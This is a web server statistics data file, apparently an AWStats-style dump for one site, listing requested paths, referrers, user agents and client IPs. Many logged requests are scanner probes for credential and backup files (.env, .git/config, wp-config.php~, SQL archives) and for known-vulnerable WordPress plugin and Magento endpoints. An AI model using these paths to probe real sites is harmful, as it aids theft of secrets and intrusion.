1	0	0	0	1	0	0	25978671	0	0	25978671	0	/.well-known/acme-challenge/ihfM1Sx74My9HO70iFCqQKzPlEWJsJy5Q99vQO65kfU
1	0	0	0	2	0	0	26055256	0	0	26055256	0	/wp-admin/admin-ajax.php?action=save&updated=true
1	0	0	0	1	0	0	26079411	0	0	26079411	0	/.git/config
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/OMC_template.tar.gz
1	0	0	0	2	0	0	26185221	0	0	26185216	0	/wp-admin/admin-post.php?wpematico-action=settings_tab_settings
1	0	0	0	8	0	0	26166575	0	0	26093943	0	/wp-admin/admin-post.php?page=301bulkoptions
1	2	0	0	2	26276651	0	26276726	26270164	0	26259571	79928	/magento2/pub/errors/503.php
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/visualizer/js/media.js
1	1	0	0	1	26278287	0	26278764	26278287	0	26278764	39962	/dev/downloader/index.php
1	0	0	0	13	0	0	26185224	0	0	26030469	0	/wp-admin/admin-post.php?action=save&updated=true
1	1	1	0	0	26276650	0	0	26276650	0	0	39924	/admin/?38.145.113.85
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/public_html.tar.gz
1	0	0	0	3	0	0	26278764	0	0	26278285	0	/staging/rss/catalog/review
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/download-plugins-dashboard/includes/js/theme_download_link.js
1	0	0	0	1	0	0	26270597	0	0	26270597	0	/ftpsync.settings
1	12	12	0	0	26088050	0	0	26066179	0	0	4782	/?66.249.75.3
1	0	0	0	2	0	0	26055255	0	0	26055255	0	/installer-data.sql.gz
1	0	0	0	1	0	0	26171812	0	0	26171812	0	/wp-content/plugins/social-polls-by-opinionstage/assets/content-popup/
1	0	0	0	8	0	0	26166580	0	0	26030469	0	/wp-admin/admin-ajax.php?action=update_zb_fbc_code
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/wp.gz
1	0	0	0	3	0	0	26036502	0	0	26030469	0	/profile/register
1	2	2	0	2	26280128	0	26278763	26278279	0	26014499	79916	/magento/index.php/admin/
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/insert-php/admin/assets/js/tag-it.js
1	0	0	0	2	0	0	26185221	0	0	26185216	0	/wp-json/wpshopify/v1/settings
1	2	2	0	2	26276651	0	26276726	26270164	0	26259570	79864	/store/admin/
1	1	0	0	1	26278287	0	26278764	26278287	0	26278764	39962	/old/downloader/index.php
1	0	0	0	1	0	0	26343223	0	0	26343223	0	/myadmin/print.css
1	0	0	0	1	0	0	26278764	0	0	26278764	0	/magento/rss/catalog/notifystock
1	0	0	0	121	0	0	26357602	0	0	25980299	0	/robots.txt
1	0	0	0	1	0	0	26278764	0	0	26278764	0	/demo/errors/503.php
1	0	0	0	2	0	0	26171811	0	0	26118768	0	/wp-content/plugins/wp-private-content-plus/css/wppcp-front.css
1	2	0	0	2	26276651	0	26276726	26270164	0	26259571	79916	/store/pub/errors/503.php
1	0	0	0	3	0	0	26280129	0	0	26278282	0	/shop/rss/catalog/review
1	0	0	0	11	0	0	26158494	0	0	26011131	0	/wp-login.php?action=register
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/OMC_template.gz
1	0	0	0	1	0	0	26046010	0	0	26046010	0	/robots.txt?34.208.155.83
1	0	0	0	3	0	0	26280129	0	0	26278282	0	/shop/rss/catalog/notifystock
1	2	2	0	2	26280128	0	26278763	26278279	0	26014499	79904	/shop/index.php/admin/
1	0	0	0	1	0	0	26118768	0	0	26118768	0	/wp-content/plugins/bold-page-builder/css/front_end/content_elements.crush.css
1	1	0	0	0	25985325	0	0	25985325	0	0	33912	/cpanel?66.249.65.80
1	2	2	0	2	26276650	0	26276726	26270164	0	26259570	79860	/shop/admin/
1	145	145	0	0	26358529	0	0	26089164	0	0	183011	/?38.145.113.85
1	0	0	0	3	0	0	26280128	0	0	26278279	0	/rss/catalog/notifystock
1	0	0	0	2	0	0	26278764	0	0	26014498	0	/downloader/index.php
1	0	0	0	3	0	0	26280128	0	0	26278279	0	/dev/rss/catalog/notifystock
1	0	0	0	2	0	0	26110808	0	0	26055255	0	/wp-content/plugins/fb-messenger/js/index.js
1	0	0	0	2	0	0	26072082	0	0	26071332	0	/wp-content/plugins/buddypress-media/lib/media-element/wp-mediaelement.min.css
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/archive.zip
1	2	2	0	2	26276651	0	26276726	26270164	0	26259571	79844	/magento/
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/lifterlms/assets/chosen/chosen.min.css
1	0	0	0	8	0	0	26166582	0	0	26030469	0	/wp-admin/admin-post.php?Action=EWD_UFAQ_UpdateOptions
1	2	0	0	2	26276651	0	26276726	26270164	0	26259571	79888	/pub/errors/503.php
1	0	0	0	1	0	0	26110810	0	0	26110810	0	/wp-content/plugins/wp-live-chat-software-for-wordpress/plugin_files/css/livechat.css
1	0	0	0	1	0	0	26319470	0	0	26319470	0	/.env?38.145.113.85
1	0	0	0	1	0	0	26171812	0	0	26171812	0	/wp-content/plugins/social-metrics-tracker/css/social-metrics-tracker.min.css
1	0	0	0	1	0	0	26000656	0	0	26000656	0	/templates/system/css/system.css
1	2	2	0	2	26280128	0	26278763	26278279	0	26014498	79880	/index.php/admin/
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/delucks-seo/modules/professional/breadcrumbs/assets/css/frontend.css
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/wp-inventory-manager/themes/css/default-theme.css
1	0	0	0	1	0	0	26162307	0	0	26162307	0	/vbulletin5/
1	0	0	0	13	0	0	26185224	0	0	26030469	0	/wp-admin/admin-post.php?yp_remote_get=3
1	0	0	0	5	0	0	26166583	0	0	26030469	0	/wp-admin/admin-ajax.php?Action=EWD_UFAQ_UpdateOptions
1	4	0	0	1	26278291	0	26278764	26278290	0	26278764	150739	/dev/errors/503.php
1	0	0	0	13	0	0	26185224	0	0	26030469	0	/wp-admin/admin-post.php?yp_remote_get=2
1	0	0	0	13	0	0	26185223	0	0	26030469	0	/wp-admin/admin-post.php?yp_remote_get=1
1	0	0	0	6	0	0	26036502	0	0	26011131	0	/wp-admin/admin-ajax.php?action=cp_add_subscriber
1	1	0	0	1	26278288	0	26278764	26278288	0	26278764	39964	/test/downloader/index.php
1	0	0	0	6	0	0	26036502	0	0	26011131	0	/wp-login.php?action=lostpassword
1	0	0	0	3	0	0	26280128	0	0	26278279	0	/old/rss/order/new
1	0	0	0	2	0	0	26278764	0	0	26278279	0	/test/rss/catalog/review
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/wp-admin.tar.gz
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/.well-known.tar.gz
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/installer-data.sql.tar.gz
1	0	0	0	6	0	0	26185223	0	0	26030469	0	/wp-admin/admin-post.php?page=yuzo-related-post
1	0	0	0	150	0	0	26347031	0	0	25980299	0	/ads.txt
1	0	0	0	2	0	0	26055255	0	0	26017937	0	/wp-admin.gz
1	0	0	0	2	0	0	26072082	0	0	26071332	0	/wp-content/plugins/wps-limit-login/assets/css/style.css
1	0	0	0	5	0	0	26185225	0	0	26078899	0	/wp-admin/admin-post.php?action=hc_ajax_save_option
1	0	0	0	1	0	0	26185221	0	0	26185221	0	/wp-admin/admin-ajax.php?action=save_map_name
1	0	0	0	2	0	0	26278764	0	0	26014498	0	/errors/503.php
1	2	2	0	1	26280128	0	26278763	26278279	0	26278763	79904	/demo/index.php/admin/
1	0	0	0	3	0	0	26280128	0	0	26278279	0	/old/rss/catalog/review
1	0	0	0	1	0	0	26171811	0	0	26171811	0	/wp-content/plugins/fv-wordpress-flowplayer/css/flowplayer.css
1	0	0	0	2	0	0	26072082	0	0	26071332	0	/wp-content/plugins/appointment-hour-booking/css/style.css
1	1	0	0	1	26278294	0	26278764	26278294	0	26278764	39958	/staging/errors/503.php
1	0	0	0	2	0	0	26278764	0	0	26278285	0	/staging/rss/catalog/notifystock
1	0	0	0	1	0	0	26343223	0	0	26343223	0	/mysql/print.css
1	604	604	0	17	26359429	0	26359341	25978679	0	26223095	1177316	/
1	0	0	0	1	0	0	26110809	0	0	26110809	0	/wp-content/plugins/yuzo-related-post/assets/js/admin.js
1	0	0	0	1	0	0	26000656	0	0	26000656	0	/admin/login.php
1	0	0	0	1	0	0	26055255	0	0	26055255	0	/baileyhulsey.sql
1	0	0	0	2	0	0	26110808	0	0	26072350	0	/wp-content/plugins/nd-shortcodes/css/style.css
1	0	0	0	2	0	0	26292956	0	0	26292956	0	/sitemap.xml
1	0	0	0	1	0	0	26208560	0	0	26208560	0	/connect.php
1	2	2	0	2	26276651	0	26276726	26270164	0	26259571	79848	/magento2/
1	0	0	0	3	0	0	26185218	0	0	26136112	0	/wp-admin/admin-ajax.php?page=wppcp-security-settings-page
1	0	0	0	1	0	0	26055256	0	0	26055256	0	/wp-admin/admin-ajax.php?yp_remote_get=test
1	0	0	0	4	0	0	26185225	0	0	26166590	0	/wp-admin/admin-ajax.php?action=hc_ajax_save_option
1	2	2	0	2	26280128	0	26278763	26278279	0	26014498	79908	/store/index.php/admin/
1	0	0	0	2	0	0	26110809	0	0	26110809	0	/wp-content/plugins/blog-designer/js/designer.js
1	0	0	0	8	0	0	26166575	0	0	26093943	0	/wp-admin/admin-ajax.php?page=301bulkoptions
1	0	0	0	1	0	0	26162307	0	0	26162307	0	/forums/
1	0	0	0	2	0	0	26172472	0	0	26172472	0	/catalog/
1	0	0	0	3	0	0	26280128	0	0	26278279	0	/dev/rss/order/new
1	0	0	0	1	0	0	26343223	0	0	26343223	0	/phpmyadmin/print.css
1	0	0	0	1	0	0	26204921	0	0	26204921	0	/wp-content/plugins/ithemes-sync/js/settings-page.js
1	0	0	0	1	0	0	26278764	0	0	26278764	0	/test/errors/503.php
1	0	0	0	1	0	0	26017937	0	0	26017937	0	/wp-content/plugins/woocommerce-checkout-manager/includes/templates/js/script_wccs.js
1	0	0	0	2	0	0	26055255	0	0	26055255	0	/wordpress.gz
1	0	0	0	3	0	0	26278764	0	0	26278284	0	/staging/rss/order/new
1	0	0	0	2	0	0	26278764	0	0	26278283	0	/store/rss/catalog/review
1	0	0	0	2	0	0	25994081	0	0	25983885	0	/robots.txt?66.249.65.80
1	0	0	0	4	0	0	26221722	0	0	26139132	0	/main.css
1	6	0	0	7	26351891	0	26323097	26253840	0	26030469	72488	/wp-login.php
1	0	0	0	4	0	0	26115519	0	0	26030469	0	/wp-json/siteground-optimizer/v1/enable-option
1	2	0	0	2	26276651	0	26276726	26270164	0	26259571	79924	/magento/pub/errors/503.php
1	0	0	0	1	0	0	26162307	0	0	26162307	0	/forum/
1	0	0	0	3	0	0	26185222	0	0	26131343	0	/wp-config.php~
1	0	0	0	6	0	0	26185225	0	0	26166585	0	/wp-admin/admin-post.php?page=wpsm_responsive_coming_soon
1	0	0	0	1	0	0	26270597	0	0	26270597	0	/deployment-config.json
1	9	0	0	0	26083929	0	0	25978675	0	0	305208	/cpanel
1	0	0	0	1	0	0	26110808	0	0	26110808	0	/wp-content/plugins/convertplug/modules/info_bar/assets/css/info_bar.min.css
1	0	0	0	1	0	0	26171812	0	0	26171812	0	/wp-content/plugins/wd-instagram-feed/css/wdi_frontend.min.css
1	2	2	0	1	26280128	0	26278763	26278279	0	26278763	79916	/staging/index.php/admin/
1	9	9	0	0	25999825	0	0	25986819	0	0	3638	/?66.249.65.80
1	0	0	0	2	0	0	26185221	0	0	26185216	0	/wp-admin/admin-post.php?page=social-metrics-tracker-export&smt_download_export_file=1&section=gapi
1	0	0	0	2	0	0	26339863	0	0	26235853	0	/ads.txt?38.145.113.85
1	1	0	0	2	26278289	0	26278764	26278289	0	26014499	39964	/shop/downloader/index.php
1	0	0	0	2	0	0	26110807	0	0	26072350	0	/wp-content/plugins/hybrid-composer/style.css
1	2	2	0	4	26276651	0	26276726	26270164	0	26172472	79836	/store/
1	0	0	0	3	0	0	26280128	0	0	26278279	0	/rss/catalog/review
1	0	0	0	1	0	0	26000656	0	0	26000656	0	/admin/images/cal_date_over.gif
3	2	2	0	4	26159169	0	26221722	26151786	0	26139132	1022	https://baileyhulsey.com/
3	2	0	0	0	26299387	0	0	26279151	0	0	24174	http://webmail.baileyhulsey.com/wp-login.php
3	0	0	0	3	0	0	26323097	0	0	26279148	0	http://webdisk.baileyhulsey.com/wp-login.php
3	0	0	0	1	0	0	25978671	0	0	25978671	0	http://cpanel.baileyhulsey.com/.well-known/acme-challenge/ihfM1Sx74My9HO70iFCqQKzPlEWJsJy5Q99vQO65kfU
3	5	0	0	0	26351891	0	0	26253840	0	0	60395	http://cpanel.baileyhulsey.com/wp-login.php
4	3	3	0	0	26181348	0	0	26181107	0	0	1533	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 3021
4	2	2	0	0	26281731	0	0	26281724	0	0	1022	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
4	0	0	0	2	0	0	26142083	0	0	26141305	0	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
4	0	0	0	1	0	0	26172472	0	0	26172472	0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
4	1	1	0	0	26227105	0	0	26227105	0	0	511	Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
4	2	2	0	0	26182455	0	0	26171465	0	0	1022	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
4	1	1	0	0	26227104	0	0	26227104	0	0	511	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
4	19	19	0	0	26281236	0	0	26072729	0	0	9439	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
4	29	29	0	0	26343425	0	0	25980632	0	0	14291	Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t12ca; +http://researchscan.comsys.rwth-aachen.de)
4	2	2	0	0	26356567	0	0	26349389	0	0	1876	Internet-structure-research-project-bot
4	4	4	0	0	26317935	0	0	26281725	0	0	2313	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
4	1	1	0	4	26000656	0	26000656	26000656	0	26000656	376	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
4	1	1	0	1	26181052	0	26181052	26181052	0	26181052	511	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 3007
4	1	1	0	0	26172471	0	0	26172471	0	0	511	Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
4	0	0	0	6	0	0	26343223	0	0	26343223	0	Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
4	2	2	0	0	26250014	0	0	26250014	0	0	1022	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
4	4	4	0	0	26281730	0	0	26281725	0	0	2044	Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1
4	96	96	0	6	26359429	0	26359341	26011210	0	26321578	292863	Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)
4	0	0	0	315	0	0	26357602	0	0	25980299	0	Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
4	1	1	0	0	26348655	0	0	26348655	0	0	938	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:15.0) Gecko/20100101 Firefox/15.0.1
4	150	150	0	4	26358529	0	26115519	25992539	0	26030469	41506	Go-http-client/1.1
4	2	2	0	0	26065751	0	0	26065751	0	0	752	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
4	1	1	0	0	26111532	0	0	26111532	0	0	511	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
4	0	0	0	1	0	0	26319470	0	0	26319470	0	curl/7.58.0
4	1	1	0	0	26044566	0	0	26044566	0	0	376	Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:62.0.2) Gecko/20100101 Firefox/62.0.2
4	5	5	0	0	26281733	0	0	26281728	0	0	2555	Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
4	1	1	0	0	26118623	0	0	26118623	0	0	511	okhttp/4.1.0
4	0	0	0	1	0	0	26172472	0	0	26172472	0	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
4	0	0	0	2	0	0	26079411	0	0	26079411	0	Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )
4	6	6	0	0	26281734	0	0	26227206	0	0	3066	Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]
4	18	18	0	379	26185225	0	26185225	26030469	0	26011131	8658	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
4	1	1	0	0	26315135	0	0	26315135	0	0	0	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
4	0	0	0	1	0	0	26172472	0	0	26172472	0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
4	4	4	0	0	26160243	0	0	26037481	0	0	1639	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
4	2	2	0	0	26323409	0	0	26281734	0	0	1291	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0
4	0	0	0	1	0	0	26292956	0	0	26292956	0	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
4	0	0	0	12	0	0	26014499	0	0	26014498	0	Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5
4	5	5	0	0	26267515	0	0	26017072	0	0	2285	python-requests/2.21.0
4	1	1	0	0	26281730	0	0	26281730	0	0	511	Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01
4	1	1	0	0	26338780	0	0	26338780	0	0	938	Python/3.8 aiohttp/3.6.2
4	1	1	0	0	26282944	0	0	26282944	0	0	511	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
4	71	39	0	125	26351891	0	26323097	26253840	0	26259570	2592567	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
4	0	0	0	1	0	0	26122512	0	0	26122512	0	Mozilla/5.0 zgrab/0.x
4	1	1	0	0	26290978	0	0	26290978	0	0	0	Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
4	2	2	0	0	26159169	0	0	26151786	0	0	1022	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
4	3	3	0	0	26281735	0	0	26281725	0	0	1533	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1
4	2	2	0	0	26355404	0	0	26355404	0	0	1876	Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0
4	3	3	0	0	26281734	0	0	26281725	0	0	1533	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
4	3	3	0	0	26281735	0	0	26281729	0	0	1533	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)
4	0	0	0	1	0	0	26172472	0	0	26172472	0	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11
4	0	0	0	1	0	0	25978671	0	0	25978671	0	Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)
4	0	0	0	1	0	0	26172472	0	0	26172472	0	Mozilla/5.0 (Windows NT 6.0; rv:43.0) Gecko/20100101 Firefox/43.0
4	38	38	0	104	26185225	0	26208562	26017937	0	26017937	16583	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
4	6	6	0	0	26281734	0	0	26281724	0	0	3066	Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02
4	1	1	0	1	26282944	0	26292956	26282944	0	26292956	511	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8
4	0	0	0	1	0	0	26172472	0	0	26172472	0	Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
4	3	3	0	0	26281734	0	0	26281728	0	0	1533	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
4	1	1	0	0	26049518	0	0	26049518	0	0	376	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
4	1	1	0	0	26303636	0	0	26303636	0	0	780	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
4	0	0	0	1	0	0	26172472	0	0	26172472	0	Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0
4	0	0	0	1	0	0	26292956	0	0	26292956	0	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
4	6	0	0	0	25985325	0	0	25978799	0	0	203472	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
4	24	24	0	3	26357164	0	26353069	25979487	0	26223095	249923	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
4	0	0	0	7	0	0	26270597	0	0	26270597	0	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
4	1	1	0	0	26172471	0	0	26172471	0	0	511	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)
4	5	5	0	6	26281735	0	26162307	26162307	0	26162307	2044	Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8
4	3	3	0	0	26338780	0	0	26338780	0	0	2814	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
4	1	1	0	0	26355479	0	0	26355479	0	0	938	Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25
4	5	5	0	1	26288104	0	26288730	26287099	0	26288730	25690	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
4	0	0	0	1	0	0	26172473	0	0	26172473	0	Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko
4	1	1	0	0	26290978	0	0	26290978	0	0	0	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
4	1	1	0	0	26226704	0	0	26226704	0	0	511	Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0
4	50	50	0	3	26351780	0	26221722	26015663	0	26139132	26716	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
4	4	4	0	0	26281735	0	0	26281724	0	0	2044	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9
4	30	30	0	6	26346527	0	26346505	26128316	0	26258138	450736	Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)
4	7	7	0	0	26281735	0	0	26281725	0	0	3577	Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
4	27	27	0	0	26343380	0	0	25980486	0	0	13000	Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t13rl; +http://researchscan.comsys.rwth-aachen.de)
4	30	30	0	0	26343444	0	0	25980595	0	0	14802	Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t12sns; +http://researchscan.comsys.rwth-aachen.de)
4	6	6	0	0	26281733	0	0	26248915	0	0	3066	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)
4	0	0	0	1	0	0	26292956	0	0	26292956	0	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
4	3	0	0	0	25979880	0	0	25978675	0	0	101736	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
4	1	0	0	0	26083929	0	0	26083929	0	0	33912	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
4	1	1	0	0	26195837	0	0	26195837	0	0	0	Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.151.0 Safari/525.19
4	1	1	0	0	26278290	0	0	26278290	0	0	12079	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
4	4	4	0	0	26281729	0	0	26281724	0	0	2044	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246
4	153	153	0	0	26221648	0	0	25981118	0	0	68404	Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
4	1	1	0	0	26250375	0	0	26250375	0	0	511	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36
4	25	25	0	0	26350581	0	0	26006867	0	0	0	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36
5	0	0	0	1	0	0	26278286	0	0	26278286	0	95.85.71.163
5	1	1	0	0	26083625	0	0	26083625	0	0	376	35.164.56.14
5	2	0	0	0	26278291	0	0	26278291	0	0	79900	72.221.232.148
5	1	1	0	0	26143963	0	0	26143963	0	0	511	34.212.121.184
5	0	0	0	1	0	0	26278285	0	0	26278285	0	120.237.237.10
5	3	3	0	0	26220843	0	0	26082102	0	0	0	129.78.110.131
5	1	0	0	0	26322874	0	0	26322874	0	0	12072	46.101.84.165
5	1	1	0	0	26209815	0	0	26209815	0	0	511	52.12.65.16
5	1	1	0	0	26217334	0	0	26217334	0	0	511	54.187.191.133
5	1	1	0	0	26229935	0	0	26229935	0	0	511	54.191.61.240
5	1	1	0	0	26041862	0	0	26041862	0	0	376	34.211.47.63
5	1	1	0	0	26092165	0	0	26092165	0	0	511	34.219.106.66
5	66	66	0	0	26323409	0	0	26182455	0	0	34264	213.159.213.236
5	1	1	0	0	26290978	0	0	26290978	0	0	0	178.128.226.90
5	1	1	0	0	26104966	0	0	26104966	0	0	511	18.237.47.247
5	1	1	0	0	26110767	0	0	26110767	0	0	511	52.41.101.17
5	1	1	0	0	26021433	0	0	26021433	0	0	376	18.237.105.228
5	1	1	0	0	26024216	0	0	26024216	0	0	376	54.188.76.249
5	1	1	0	0	26073335	0	0	26073335	0	0	376	34.222.106.106
5	1	1	0	0	26005669	0	0	26005669	0	0	376	52.11.59.115
5	1	1	0	0	26051578	0	0	26051578	0	0	376	18.236.173.177
5	0	0	0	1	0	0	26279148	0	0	26279148	0	150.95.52.74
5	0	0	0	1	0	0	26298539	0	0	26298539	0	64.225.11.195
5	1	1	0	0	26190115	0	0	26190115	0	0	511	35.163.182.68
